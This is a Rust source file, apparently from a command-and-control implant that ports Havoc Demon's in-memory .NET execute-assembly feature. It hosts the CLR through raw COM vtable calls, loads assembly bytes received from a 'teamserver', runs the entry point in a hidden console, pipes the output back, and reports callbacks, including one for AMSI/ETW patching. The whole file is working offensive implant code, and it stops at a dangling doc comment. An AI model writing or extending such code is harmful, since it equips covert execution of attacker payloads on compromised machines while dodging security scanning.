//! .NET CLR hosting for inline assembly execution.
//!
//! On Windows, loads mscoree.dll and oleaut32.dll at runtime, walks the COM
//! vtables for `ICLRMetaHost` → `ICLRRuntimeInfo` → `ICorRuntimeHost`, creates
//! an AppDomain, loads the assembly via `_AppDomain::Load_3`, resolves the entry
//! point, and invokes it with `_MethodInfo::Invoke_3`.  Stdout is captured via a
//! named pipe whose path is supplied by the teamserver.
//!
//! All COM vtable calls are raw FFI through manually-defined vtable indices —
//! no `winapi` crate, only `windows-sys` for flat Win32 function imports.

use tracing::warn;

// ─── .NET callback info IDs (agent → server) ───────────────────────────────

/// AMSI/ETW patches have been applied (hardware breakpoint engine).
pub const DOTNET_INFO_PATCHED: u32 = 1;
/// Reports the CLR version string being used.
pub const DOTNET_INFO_NET_VERSION: u32 = 2;
/// Assembly entry point has been invoked; includes the thread ID.
pub const DOTNET_INFO_ENTRYPOINT_EXECUTED: u32 = 3;
/// Assembly execution completed successfully.
pub const DOTNET_INFO_FINISHED: u32 = 4;
/// CLR initialisation or assembly execution failed.
pub const DOTNET_INFO_FAILED: u32 = 5;

/// A single .NET execution callback to send to the teamserver.
#[derive(Debug)]
pub struct DotnetCallback {
    /// One of the `DOTNET_INFO_*` constants.
    pub info_id: u32,
    /// Payload bytes for this callback (info-specific encoding).
    pub payload: Vec<u8>,
}

/// Result of a .NET assembly execution attempt.
#[derive(Debug)]
pub struct DotnetResult {
    /// Callback entries to send back to the teamserver.
    pub callbacks: Vec<DotnetCallback>,
    /// Captured stdout output from the assembly, if any.
    pub output: Vec<u8>,
}

// ─── Windows CLR hosting implementation ─────────────────────────────────────

#[cfg(windows)]
#[allow(unsafe_code)]
mod clr {
    use super::*;
    use std::ffi::c_void;
    use tracing::{debug, error, info};

    // ── COM GUID ────────────────────────────────────────────────────────

    #[repr(C)]
    #[derive(Clone, Copy)]
    struct Guid {
        data1: u32,
        data2: u16,
        data3: u16,
        data4: [u8; 8],
    }

    static CLSID_CLR_META_HOST: Guid = Guid {
        data1: 0x9280188d,
        data2: 0x0e8e,
        data3: 0x4867,
        data4: [0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde],
    };

    static CLSID_COR_RUNTIME_HOST: Guid = Guid {
        data1: 0xcb2f6723,
        data2: 0xab3a,
        data3: 0x11d2,
        data4: [0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e],
    };

    static IID_ICLR_META_HOST: Guid = Guid {
        data1: 0xD332DB9E,
        data2: 0xB9B3,
        data3: 0x4125,
        data4: [0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16],
    };

    static IID_ICLR_RUNTIME_INFO: Guid = Guid {
        data1: 0xBD39D1D2,
        data2: 0xBA2F,
        data3: 0x486a,
        data4: [0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91],
    };

    static IID_ICOR_RUNTIME_HOST: Guid = Guid {
        data1: 0xcb2f6722,
        data2: 0xab3a,
        data3: 0x11d2,
        data4: [0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e],
    };

    static IID_APP_DOMAIN: Guid = Guid {
        data1: 0x05F696DC,
        data2: 0x2B29,
        data3: 0x3663,
        data4: [0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13],
    };

    // ── OLE Automation types ────────────────────────────────────────────

    /// COM VARIANT (16 bytes on x64).
    #[repr(C)]
    #[derive(Clone, Copy)]
    struct Variant {
        vt: u16,
        reserved1: u16,
        reserved2: u16,
        reserved3: u16,
        /// Union data — 8 bytes.  We access it as either a pointer or a u64.
        data: u64,
    }

    impl Variant {
        const fn empty() -> Self {
            Self { vt: 0, reserved1: 0, reserved2: 0, reserved3: 0, data: 0 }
        }
    }

    #[repr(C)]
    struct SafeArrayBound {
        c_elements: u32,
        l_lbound: i32,
    }

    // VARIANT type constants.
    const VT_UI1: u16 = 17;
    const VT_BSTR: u16 = 8;
    const VT_VARIANT: u16 = 12;
    const VT_ARRAY: u16 = 0x2000;

    // HRESULT success.
    const S_OK: i32 = 0;

    // ── COM vtable indices (counted from Havoc Clr.h) ───────────────────

    // IUnknown
    const IUNKNOWN_QUERY_INTERFACE: usize = 0;
    const IUNKNOWN_RELEASE: usize = 2;

    // ICLRMetaHost : IUnknown
    const META_HOST_GET_RUNTIME: usize = 3;

    // ICLRRuntimeInfo : IUnknown
    const RUNTIME_INFO_GET_INTERFACE: usize = 9;
    const RUNTIME_INFO_IS_LOADABLE: usize = 10;

    // ICorRuntimeHost : IUnknown
    const COR_HOST_START: usize = 10;
    const COR_HOST_STOP: usize = 11;
    const COR_HOST_CREATE_DOMAIN: usize = 12;
    const COR_HOST_UNLOAD_DOMAIN: usize = 20;

    // _AppDomain (IDispatch-based, large vtable)
    const APP_DOMAIN_LOAD_3: usize = 45;

    // _Assembly
    const ASSEMBLY_ENTRY_POINT: usize = 16;

    // _MethodInfo
    const METHOD_INFO_INVOKE_3: usize = 37;

    // ── Pipe / console constants ────────────────────────────────────────

    const PIPE_BUFFER: u32 = 0x10000 * 5;
    const STD_OUTPUT_HANDLE: u32 = 0xFFFF_FFF5; // (DWORD)-11

    // ── Function pointer types for dynamically loaded DLLs ──────────────

    type ClrCreateInstanceFn =
        unsafe extern "system" fn(*const Guid, *const Guid, *mut *mut c_void) -> i32;

    type SafeArrayCreateFn =
        unsafe extern "system" fn(vt: u16, dims: u32, bounds: *const SafeArrayBound) -> *mut c_void;

    type SafeArrayCreateVectorFn =
        unsafe extern "system" fn(vt: u16, lower: i32, count: u32) -> *mut c_void;

    type SafeArrayAccessDataFn =
        unsafe extern "system" fn(sa: *mut c_void, data: *mut *mut c_void) -> i32;

    type SafeArrayUnaccessDataFn = unsafe extern "system" fn(sa: *mut c_void) -> i32;

    type SafeArrayPutElementFn = unsafe extern "system" fn(
        sa: *mut c_void,
        indices: *const i32,
        value: *const c_void,
    ) -> i32;

    type SafeArrayDestroyFn = unsafe extern "system" fn(sa: *mut c_void) -> i32;

    type SysAllocStringFn = unsafe extern "system" fn(s: *const u16) -> *mut u16;

    type SysFreeStringFn = unsafe extern "system" fn(s: *mut u16);

    /// Bundle of oleaut32 function pointers resolved at runtime.
    struct OleAutApi {
        safe_array_create: SafeArrayCreateFn,
        safe_array_create_vector: SafeArrayCreateVectorFn,
        safe_array_access_data: SafeArrayAccessDataFn,
        safe_array_unaccess_data: SafeArrayUnaccessDataFn,
        safe_array_put_element: SafeArrayPutElementFn,
        safe_array_destroy: SafeArrayDestroyFn,
        sys_alloc_string: SysAllocStringFn,
        sys_free_string: SysFreeStringFn,
    }

    // ── COM vtable call helper ──────────────────────────────────────────

    /// Read a function pointer from a COM object's vtable at the given slot.
    ///
    /// # Safety
    ///
    /// `this` must be a valid COM interface pointer whose first pointer-sized
    /// field points to a vtable array.  `index` must be within bounds.
    unsafe fn vtable_fn(this: *mut c_void, index: usize) -> *const c_void {
        let vtable = *(this as *const *const *const c_void);
        *vtable.add(index)
    }

    // ── UTF-16 helpers ──────────────────────────────────────────────────

    /// Encode a Rust `&str` as a null-terminated UTF-16LE wide string.
    fn to_wide(s: &str) -> Vec<u16> {
        s.encode_utf16().chain(std::iter::once(0u16)).collect()
    }

    // ── Session state (owns COM pointers; Drop cleans up) ───────────────

    /// Holds all COM interface pointers, SafeArrays, and pipe handles
    /// acquired during a CLR hosting session.  [`Drop`] releases them in
    /// the correct reverse order so every error path gets automatic cleanup.
    struct ClrSession {
        // oleaut32 API (needed for SafeArrayDestroy in Drop)
        ole: Option<OleAutApi>,

        // COM interfaces (null = not yet acquired)
        meta_host: *mut c_void,
        runtime_info: *mut c_void,
        cor_runtime_host: *mut c_void,
        app_domain_thunk: *mut c_void,
        app_domain: *mut c_void,
        assembly: *mut c_void,
        method_info: *mut c_void,

        // SafeArrays
        safe_array: *mut c_void,
        method_args: *mut c_void,

        // Pipe handles
        pipe_read: isize,
        pipe_write: isize,

        // Stdout redirection state
        original_stdout: isize,
        stdout_redirected: bool,
    }

    impl ClrSession {
        fn new() -> Self {
            Self {
                ole: None,
                meta_host: std::ptr::null_mut(),
                runtime_info: std::ptr::null_mut(),
                cor_runtime_host: std::ptr::null_mut(),
                app_domain_thunk: std::ptr::null_mut(),
                app_domain: std::ptr::null_mut(),
                assembly: std::ptr::null_mut(),
                method_info: std::ptr::null_mut(),
                safe_array: std::ptr::null_mut(),
                method_args: std::ptr::null_mut(),
                pipe_read: 0,
                pipe_write: 0,
                original_stdout: 0,
                stdout_redirected: false,
            }
        }
    }

    impl Drop for ClrSession {
        fn drop(&mut self) {
            // SAFETY: All COM Release calls and handle closures follow the
            // standard COM release protocol.  Pointers are only non-null when
            // they were successfully acquired from a prior COM call.

            // Restore stdout first.
            if self.stdout_redirected {
                unsafe {
                    windows_sys::Win32::System::Console::SetStdHandle(
                        STD_OUTPUT_HANDLE,
                        self.original_stdout,
                    );
                }
            }

            // Destroy SafeArrays.
            if let Some(ref ole) = self.ole {
                if !self.method_args.is_null() {
                    unsafe {
                        (ole.safe_array_destroy)(self.method_args);
                    }
                }
                if !self.safe_array.is_null() {
                    unsafe {
                        (ole.safe_array_destroy)(self.safe_array);
                    }
                }
            }

            // Release COM objects in reverse acquisition order.
            unsafe {
                release_if_nonnull(self.method_info);
                release_if_nonnull(self.assembly);
                release_if_nonnull(self.app_domain);

                // Unload domain and stop the runtime before releasing.
                if !self.cor_runtime_host.is_null() {
                    if !self.app_domain_thunk.is_null() {
                        let unload: unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32 =
                            std::mem::transmute(vtable_fn(
                                self.cor_runtime_host,
                                COR_HOST_UNLOAD_DOMAIN,
                            ));
                        let _ = unload(self.cor_runtime_host, self.app_domain_thunk);
                    }
                    let stop: unsafe extern "system" fn(*mut c_void) -> i32 =
                        std::mem::transmute(vtable_fn(self.cor_runtime_host, COR_HOST_STOP));
                    let _ = stop(self.cor_runtime_host);
                }

                release_if_nonnull(self.app_domain_thunk);
                release_if_nonnull(self.cor_runtime_host);
                release_if_nonnull(self.runtime_info);
                release_if_nonnull(self.meta_host);
            }

            // Close pipe handles.
            if self.pipe_write != 0 {
                unsafe {
                    windows_sys::Win32::Foundation::CloseHandle(self.pipe_write);
                }
            }
            if self.pipe_read != 0 {
                unsafe {
                    windows_sys::Win32::Foundation::CloseHandle(self.pipe_read);
                }
            }
        }
    }

    /// Call `IUnknown::Release` if the pointer is non-null.
    ///
    /// # Safety
    ///
    /// `ptr` must be either null or a valid COM interface pointer.
    unsafe fn release_if_nonnull(ptr: *mut c_void) {
        if !ptr.is_null() {
            let release: unsafe extern "system" fn(*mut c_void) -> u32 =
                std::mem::transmute(vtable_fn(ptr, IUNKNOWN_RELEASE));
            release(ptr);
        }
    }

    // ── DLL loading helpers ─────────────────────────────────────────────

    /// Resolve a single function from a module handle.
    unsafe fn get_proc(
        module: isize,
        name: &[u8], // must be null-terminated
    ) -> Result<*const c_void, String> {
        // SAFETY: module is a valid HMODULE from LoadLibraryA and name is
        // a valid null-terminated ASCII string.
        let addr = windows_sys::Win32::System::LibraryLoader::GetProcAddress(module, name.as_ptr());
        match addr {
            Some(f) => Ok(f as *const c_void),
            None => Err(format!(
                "GetProcAddress failed for {}",
                String::from_utf8_lossy(&name[..name.len().saturating_sub(1)])
            )),
        }
    }

    /// Load a DLL by ASCII name.
    unsafe fn load_library(name: &[u8]) -> Result<isize, String> {
        // SAFETY: name is a valid null-terminated ASCII string.
        let h = windows_sys::Win32::System::LibraryLoader::LoadLibraryA(name.as_ptr());
        if h == 0 {
            Err(format!(
                "LoadLibraryA failed for {}",
                String::from_utf8_lossy(&name[..name.len().saturating_sub(1)])
            ))
        } else {
            Ok(h)
        }
    }

    /// Load oleaut32.dll and resolve all needed SafeArray / SysAllocString
    /// functions.
    unsafe fn load_oleaut32() -> Result<OleAutApi, String> {
        let h = load_library(b"oleaut32.dll\0")?;
        Ok(OleAutApi {
            safe_array_create: std::mem::transmute(get_proc(h, b"SafeArrayCreate\0")?),
            safe_array_create_vector: std::mem::transmute(get_proc(h, b"SafeArrayCreateVector\0")?),
            safe_array_access_data: std::mem::transmute(get_proc(h, b"SafeArrayAccessData\0")?),
            safe_array_unaccess_data: std::mem::transmute(get_proc(h, b"SafeArrayUnaccessData\0")?),
            safe_array_put_element: std::mem::transmute(get_proc(h, b"SafeArrayPutElement\0")?),
            safe_array_destroy: std::mem::transmute(get_proc(h, b"SafeArrayDestroy\0")?),
            sys_alloc_string: std::mem::transmute(get_proc(h, b"SysAllocString\0")?),
            sys_free_string: std::mem::transmute(get_proc(h, b"SysFreeString\0")?),
        })
    }

    // ── Named pipe creation ─────────────────────────────────────────────

    /// Create a named pipe pair (read handle, write handle) for stdout capture.
    unsafe fn create_pipe_pair(pipe_name: &str) -> Result<(isize, isize), String> {
        let wide = to_wide(pipe_name);

        // SAFETY: CreateNamedPipeW with valid wide string and standard flags.
        let pipe_read = windows_sys::Win32::System::Pipes::CreateNamedPipeW(
            wide.as_ptr(),
            0x0000_0003 | 0x0008_0000, // PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE
            0x0000_0004,               // PIPE_TYPE_MESSAGE
            255,                       // PIPE_UNLIMITED_INSTANCES
            PIPE_BUFFER,
            PIPE_BUFFER,
            0,
            std::ptr::null(),
        );

        if pipe_read == windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE {
            return Err(format!(
                "CreateNamedPipeW failed: error {}",
                windows_sys::Win32::Foundation::GetLastError()
            ));
        }

        // SAFETY: CreateFileW to open the pipe's write end.
        let pipe_write = windows_sys::Win32::Storage::FileSystem::CreateFileW(
            wide.as_ptr(),
            0x4000_0000, // GENERIC_WRITE
            0x0000_0001, // FILE_SHARE_READ
            std::ptr::null(),
            3,           // OPEN_EXISTING
            0x0000_0080, // FILE_ATTRIBUTE_NORMAL
            0,
        );

        if pipe_write == windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE {
            let err = windows_sys::Win32::Foundation::GetLastError();
            windows_sys::Win32::Foundation::CloseHandle(pipe_read);
            return Err(format!("CreateFileW (pipe write end) failed: error {err}"));
        }

        Ok((pipe_read, pipe_write))
    }

    // ── Pipe output reading ─────────────────────────────────────────────

    /// Read all available bytes from the read end of a named pipe.
    unsafe fn read_pipe_output(pipe_read: isize) -> Vec<u8> {
        let mut available: u32 = 0;

        // SAFETY: PeekNamedPipe with valid handle.
        let ok = windows_sys::Win32::System::Pipes::PeekNamedPipe(
            pipe_read,
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
            &mut available,
            std::ptr::null_mut(),
        );

        if ok == 0 || available == 0 {
            return Vec::new();
        }

        let mut buf = vec![0u8; available as usize];
        let mut bytes_read: u32 = 0;

        // SAFETY: ReadFile with a buffer large enough for `available` bytes.
        let ok = windows_sys::Win32::Storage::FileSystem::ReadFile(
            pipe_read,
            buf.as_mut_ptr().cast(),
            available,
            &mut bytes_read,
            std::ptr::null_mut(),
        );

        if ok == 0 {
            return Vec::new();
        }

        buf.truncate(bytes_read as usize);
        buf
    }

    // ── Console allocation ──────────────────────────────────────────────

    /// Ensure a console window exists (hidden).  .NET Console.Write needs one.
    unsafe fn ensure_console() {
        let wnd = windows_sys::Win32::System::Console::GetConsoleWindow();
        if wnd == 0 {
            windows_sys::Win32::System::Console::AllocConsole();
            let wnd = windows_sys::Win32::System::Console::GetConsoleWindow();
            if wnd != 0 {
                // SW_HIDE = 0
                windows_sys::Win32::UI::WindowsAndMessaging::ShowWindow(wnd, 0);
            }
        }
    }

    // ── Argument parsing ────────────────────────────────────────────────

    /// Split an argument string the same way Havoc does: treat it as a Windows
    /// command line, skip argv[0] (the "program name"), and return the rest.
    ///
    /// This is a simplified parser that handles quoted strings.
    fn parse_assembly_args(raw: &str) -> Vec<String> {
        let trimmed = raw.trim();
        if trimmed.is_empty() {
            return Vec::new();
        }

        let mut args = Vec::new();
        let mut current = String::new();
        let mut in_quotes = false;
        let mut chars = trimmed.chars().peekable();

        while let Some(ch) = chars.next() {
            match ch {
                '"' => in_quotes = !in_quotes,
                ' ' if !in_quotes => {
                    if !current.is_empty() {
                        args.push(std::mem::take(&mut current));
                    }
                }
                _ => current.push(ch),
            }
        }
        if !current.is_empty() {
            args.push(current);
        }

        // Havoc's CommandLineToArgvW skips argv[0] (program name).
        if args.len() > 1 { args.drain(1..).collect() } else { Vec::new() }
    }

    // ── Main execution entry point ──────────────────────────────────────

    /// Execute a .NET assembly inside the CLR.
    ///
    /// Follows the same flow as Havoc Demon's `DotnetExecute` + `ClrCreateInstance`:
    /// 1. Load mscoree.dll → CLRCreateInstance
    /// 2. ICLRMetaHost::GetRuntime → ICLRRuntimeInfo
    /// 3. ICLRRuntimeInfo::IsLoadable + GetInterface → ICorRuntimeHost
    /// 4. ICorRuntimeHost::Start + CreateDomain → AppDomain
    /// 5. _AppDomain::Load_3(SafeArray of assembly bytes) → _Assembly
    /// 6. _Assembly::EntryPoint → _MethodInfo
    /// 7. Redirect stdout to named pipe
    /// 8. _MethodInfo::Invoke_3(null, args)
    /// 9. Restore stdout, read pipe output
    pub fn execute(
        pipe_name: &str,
        app_domain: &str,
        net_version: &str,
        assembly_data: &[u8],
        assembly_args: &str,
    ) -> DotnetResult {
        // SAFETY: All unsafe blocks in this function perform Win32 FFI calls
        // or COM vtable calls.  Each is documented with its safety rationale.
        unsafe { execute_inner(pipe_name, app_domain, net_version, assembly_data, assembly_args) }
    }

    unsafe fn execute_inner(
        pipe_name: &str,
        app_domain_name: &str,
        net_version: &str,
        assembly_data: &[u8],
        assembly_args: &str,
    ) -> DotnetResult {
        let mut session = ClrSession::new();
        let mut callbacks = Vec::new();

        // ── 1. Load DLLs ────────────────────────────────────────────────

        let mscoree = match load_library(b"mscoree.dll\0") {
            Ok(h) => h,
            Err(e) => {
                error!("dotnet: {e}");
                return fail_result(&e);
            }
        };

        let clr_create_instance: ClrCreateInstanceFn =
            match get_proc(mscoree, b"CLRCreateInstance\0") {
                Ok(p) => std::mem::transmute(p),
                Err(e) => {
                    error!("dotnet: {e}");
                    return fail_result(&e);
                }
            };

        let ole = match load_oleaut32() {
            Ok(api) => api,
            Err(e) => {
                error!("dotnet: {e}");
                return fail_result(&e);
            }
        };

        // ── 2. CLRCreateInstance → ICLRMetaHost ─────────────────────────

        // SAFETY: calling CLRCreateInstance with valid GUID pointers and
        // an out-pointer for the ICLRMetaHost interface.
        let hr =
            clr_create_instance(&CLSID_CLR_META_HOST, &IID_ICLR_META_HOST, &mut session.meta_host);
        if hr != S_OK {
            error!("CLRCreateInstance failed: HRESULT 0x{hr:08X}");
            return fail_result(&format!("CLRCreateInstance HRESULT 0x{hr:08X}"));
        }
        debug!("CLRCreateInstance succeeded");

        // ── 3. ICLRMetaHost::GetRuntime → ICLRRuntimeInfo ───────────────

        let version_wide = to_wide(net_version);

        // SAFETY: calling GetRuntime through the ICLRMetaHost vtable.
        // meta_host is a valid COM pointer from CLRCreateInstance.
        let get_runtime: unsafe extern "system" fn(
            *mut c_void,
            *const u16,
            *const Guid,
            *mut *mut c_void,
        ) -> i32 = std::mem::transmute(vtable_fn(session.meta_host, META_HOST_GET_RUNTIME));
        let hr = get_runtime(
            session.meta_host,
            version_wide.as_ptr(),
            &IID_ICLR_RUNTIME_INFO,
            &mut session.runtime_info,
        );
        if hr != S_OK {
            error!("ICLRMetaHost::GetRuntime failed: HRESULT 0x{hr:08X}");
            return fail_result(&format!("GetRuntime({net_version}) HRESULT 0x{hr:08X}"));
        }
        debug!("GetRuntime({net_version}) succeeded");

        // ── 4. ICLRRuntimeInfo::IsLoadable ──────────────────────────────

        let mut loadable: i32 = 0;
        // SAFETY: calling IsLoadable through ICLRRuntimeInfo vtable.
        let is_loadable: unsafe extern "system" fn(*mut c_void, *mut i32) -> i32 =
            std::mem::transmute(vtable_fn(session.runtime_info, RUNTIME_INFO_IS_LOADABLE));
        let hr = is_loadable(session.runtime_info, &mut loadable);
        if hr != S_OK || loadable == 0 {
            error!("CLR {net_version} is not loadable (hr=0x{hr:08X}, loadable={loadable})");
            return fail_result(&format!("CLR {net_version} not loadable"));
        }

        // ── 5. ICLRRuntimeInfo::GetInterface → ICorRuntimeHost ──────────

        // SAFETY: calling GetInterface through ICLRRuntimeInfo vtable.
        let get_interface: unsafe extern "system" fn(
            *mut c_void,
            *const Guid,
            *const Guid,
            *mut *mut c_void,
        ) -> i32 = std::mem::transmute(vtable_fn(session.runtime_info, RUNTIME_INFO_GET_INTERFACE));
        let hr = get_interface(
            session.runtime_info,
            &CLSID_COR_RUNTIME_HOST,
            &IID_ICOR_RUNTIME_HOST,
            &mut session.cor_runtime_host,
        );
        if hr != S_OK {
            error!("GetInterface(ICorRuntimeHost) failed: HRESULT 0x{hr:08X}");
            return fail_result(&format!("GetInterface HRESULT 0x{hr:08X}"));
        }
        debug!("ICorRuntimeHost acquired");

        // ── 6. ICorRuntimeHost::Start ───────────────────────────────────

        // SAFETY: calling Start through ICorRuntimeHost vtable.
        let start: unsafe extern "system" fn(*mut c_void) -> i32 =
            std::mem::transmute(vtable_fn(session.cor_runtime_host, COR_HOST_START));
        let hr = start(session.cor_runtime_host);
        if hr != S_OK {
            error!("ICorRuntimeHost::Start failed: HRESULT 0x{hr:08X}");
            return fail_result(&format!("Start HRESULT 0x{hr:08X}"));
        }
        info!("CLR runtime started");

        // Report the .NET version to the teamserver.
        callbacks.push(DotnetCallback {
            info_id: DOTNET_INFO_NET_VERSION,
            payload: net_version.encode_utf16().flat_map(|c| c.to_le_bytes()).collect(),
        });

        // Store oleaut32 API in session so Drop can call SafeArrayDestroy.
        session.ole = Some(ole);
        // Reborrow after move:
        let ole = session.ole.as_ref().expect("just assigned");

        // ── 7. Create named pipe for stdout capture ─────────────────────

        match create_pipe_pair(pipe_name) {
            Ok((r, w)) => {
                session.pipe_read = r;
                session.pipe_write = w;
            }
            Err(e) => {
                error!("dotnet: pipe creation failed: {e}");
                return fail_result(&e);
            }
        }

        // Ensure a (hidden) console exists so Console.Write works.
        ensure_console();

        // ── 8. Build SafeArray for assembly bytes ───────────────────────

        let bound = SafeArrayBound { c_elements: assembly_data.len() as u32, l_lbound: 0 };
        // SAFETY: SafeArrayCreate with valid bound.
        session.safe_array = (ole.safe_array_create)(VT_UI1, 1, &bound);
        if session.safe_array.is_null() {
            error!("SafeArrayCreate failed");
            return fail_result("SafeArrayCreate failed");
        }

        // Copy assembly bytes into the SafeArray.
        let mut sa_data: *mut c_void = std::ptr::null_mut();
        let hr = (ole.safe_array_access_data)(session.safe_array, &mut sa_data);
        if hr != S_OK || sa_data.is_null() {
            error!("SafeArrayAccessData failed: 0x{hr:08X}");
            return fail_result("SafeArrayAccessData failed");
        }
        // SAFETY: sa_data points to safe_array's internal buffer with
        // at least assembly_data.len() bytes allocated.
        std::ptr::copy_nonoverlapping(
            assembly_data.as_ptr(),
            sa_data as *mut u8,
            assembly_data.len(),
        );
        let hr = (ole.safe_array_unaccess_data)(session.safe_array);
        if hr != S_OK {
            error!("SafeArrayUnaccessData failed: 0x{hr:08X}");
            return fail_result("SafeArrayUnaccessData failed");
        }

        // ── 9. ICorRuntimeHost::CreateDomain ────────────────────────────

        let domain_wide = to_wide(app_domain_name);
        // SAFETY: calling CreateDomain through ICorRuntimeHost vtable.
        // Signature: CreateDomain(this, friendlyName, identityArray, appDomain)
        let create_domain: unsafe extern "system" fn(
            *mut c_void,
            *const u16,
            *mut c_void,
            *mut *mut c_void,
        ) -> i32 = std::mem::transmute(vtable_fn(session.cor_runtime_host, COR_HOST_CREATE_DOMAIN));
        let hr = create_domain(
            session.cor_runtime_host,
            domain_wide.as_ptr(),
            std::ptr::null_mut(),
            &mut session.app_domain_thunk,
        );
        if hr != S_OK {
            error!("CreateDomain failed: HRESULT 0x{hr:08X}");
            return fail_result(&format!("CreateDomain HRESULT 0x{hr:08X}"));
        }
        debug!("AppDomain created");

        // ── 10. QueryInterface for _AppDomain ───────────────────────────

        // SAFETY: calling IUnknown::QueryInterface on the AppDomainThunk.
        let qi: unsafe extern "system" fn(*mut c_void, *const Guid, *mut *mut c_void) -> i32 =
            std::mem::transmute(vtable_fn(session.app_domain_thunk, IUNKNOWN_QUERY_INTERFACE));
        let hr = qi(session.app_domain_thunk, &IID_APP_DOMAIN, &mut session.app_domain);
        if hr != S_OK {
            error!("QueryInterface(_AppDomain) failed: HRESULT 0x{hr:08X}");
            return fail_result(&format!("QI AppDomain HRESULT 0x{hr:08X}"));
        }

        // ── 11. _AppDomain::Load_3(SafeArray) → _Assembly ──────────────

        // SAFETY: calling Load_3 through _AppDomain vtable at index 45.
        // Signature: Load_3(this, rawAssembly: *mut SAFEARRAY, pRetVal: *mut *mut Assembly)
        let load_3: unsafe extern "system" fn(*mut c_void, *mut c_void, *mut *mut c_void) -> i32 =
            std::mem::transmute(vtable_fn(session.app_domain, APP_DOMAIN_LOAD_3));
        let hr = load_3(session.app_domain, session.safe_array, &mut session.assembly);
        if hr != S_OK {
            error!("_AppDomain::Load_3 failed: HRESULT 0x{hr:08X}");
            return fail_result(&format!("Load_3 HRESULT 0x{hr:08X}"));
        }
        debug!("Assembly loaded from {} bytes", assembly_data.len());

        // ── 12. _Assembly::EntryPoint → _MethodInfo ─────────────────────

        // SAFETY: calling EntryPoint through _Assembly vtable at index 16.
        let entry_point: unsafe extern "system" fn(*mut c_void, *mut *mut c_void) -> i32 =
            std::mem::transmute(vtable_fn(session.assembly, ASSEMBLY_ENTRY_POINT));
        let hr = entry_point(session.assembly, &mut session.method_info);
        if hr != S_OK {
            error!("_Assembly::EntryPoint failed: HRESULT 0x{hr:08X}");
            return fail_result(&format!("EntryPoint HRESULT 0x{hr:08X}"));
        }

        // ── 13. Build args SafeArray ────────────────────────────────────

        // MethodArgs is a SAFEARRAY(VARIANT) with 1 element — a VARIANT
        // containing SAFEARRAY(BSTR) of the argument strings.
        session.method_args = (ole.safe_array_create_vector)(VT_VARIANT, 0, 1);
        if session.method_args.is_null() {
            error!("SafeArrayCreateVector(VT_VARIANT) failed");
            return fail_result("SafeArrayCreateVector for method_args failed");
        }

        let args = parse_assembly_args(assembly_args);
        let args_count = args.len() as u32;

        // Create inner SAFEARRAY(BSTR) for the string[] args.
        let bstr_array = (ole.safe_array_create_vector)(VT_BSTR, 0, args_count);
        if bstr_array.is_null() && args_count > 0 {
            error!("SafeArrayCreateVector(VT_BSTR) failed");
            return fail_result("SafeArrayCreateVector for bstr_array failed");
        }

        // Fill BSTRs.
        let mut allocated_bstrs: Vec<*mut u16> = Vec::new();
        for (i, arg) in args.iter().enumerate() {
            let wide = to_wide(arg);
            let bstr = (ole.sys_alloc_string)(wide.as_ptr());
            allocated_bstrs.push(bstr);
            let idx = i as i32;
            let hr = (ole.safe_array_put_element)(bstr_array, &idx, bstr as *const c_void);
            if hr != S_OK {
                error!("SafeArrayPutElement(bstr_array, {i}) failed: 0x{hr:08X}");
                // Clean up allocated BSTRs.
                for b in &allocated_bstrs {
                    if !b.is_null() {
                        (ole.sys_free_string)(*b);
                    }
                }
                return fail_result("SafeArrayPutElement bstr failed");
            }
        }

        // Build the VARIANT that wraps the BSTR array.
        let mut vt_psa = Variant::empty();
        vt_psa.vt = VT_ARRAY | VT_BSTR;
        // Store the SAFEARRAY pointer in the VARIANT's data field.
        vt_psa.data = if bstr_array.is_null() { 0 } else { bstr_array as u64 };

        // Put it into MethodArgs[0].
        let idx_zero: i32 = 0;
        let hr = (ole.safe_array_put_element)(
            session.method_args,
            &idx_zero,
            &vt_psa as *const Variant as *const c_void,
        );
        if hr != S_OK {
            error!("SafeArrayPutElement(method_args) failed: 0x{hr:08X}");
            return fail_result("SafeArrayPutElement method_args failed");
        }

        // ── 14. Redirect stdout to pipe ─────────────────────────────────

        session.original_stdout =
            windows_sys::Win32::System::Console::GetStdHandle(STD_OUTPUT_HANDLE);
        windows_sys::Win32::System::Console::SetStdHandle(STD_OUTPUT_HANDLE, session.pipe_write);
        session.stdout_redirected = true;

        // ── 15. _MethodInfo::Invoke_3 ───────────────────────────────────

        let obj = Variant::empty(); // null 'this' for static Main
        let mut ret = Variant::empty();

        // SAFETY: calling Invoke_3 through _MethodInfo vtable at index 37.
        // Signature: Invoke_3(this, obj: VARIANT, parameters: *mut SAFEARRAY, ret: *mut VARIANT)
        let invoke_3: unsafe extern "system" fn(
            *mut c_void,
            Variant,
            *mut c_void,
            *mut Variant,
        ) -> i32 = std::mem::transmute(vtable_fn(session.method_info, METHOD_INFO_INVOKE_3));
        let hr = invoke_3(session.method_info, obj, session.method_args, &mut ret);

        // ── 16. Restore stdout and read output ──────────────────────────

        windows_sys::Win32::System::Console::SetStdHandle(
            STD_OUTPUT_HANDLE,
            session.original_stdout,
        );
        session.stdout_redirected = false;

        // Read everything the assembly wrote.
        let mut output = read_pipe_output(session.pipe_read);
        // Second read in case there's trailing data (matches Havoc DotnetPush).
        let trailing = read_pipe_output(session.pipe_read);
        if !trailing.is_empty() {
            output.extend_from_slice(&trailing);
        }

        if hr != S_OK {
            error!("_MethodInfo::Invoke_3 failed: HRESULT 0x{hr:08X}");
            callbacks.push(DotnetCallback { info_id: DOTNET_INFO_FAILED, payload: Vec::new() });
        } else {
            info!("Assembly entry point executed successfully");
            callbacks.push(DotnetCallback { info_id: DOTNET_INFO_FINISHED, payload: Vec::new() });
        }

        DotnetResult { callbacks, output }
    }

    fn fail_result(msg: &str) -> DotnetResult {
        warn!("dotnet_execute failed: {msg}");
        DotnetResult {
            callbacks: vec![DotnetCallback { info_id: DOTNET_INFO_FAILED, payload: Vec::new() }],
            output: Vec::new(),
        }
    }
}

/// Execute a .NET assembly using the CLR.
///
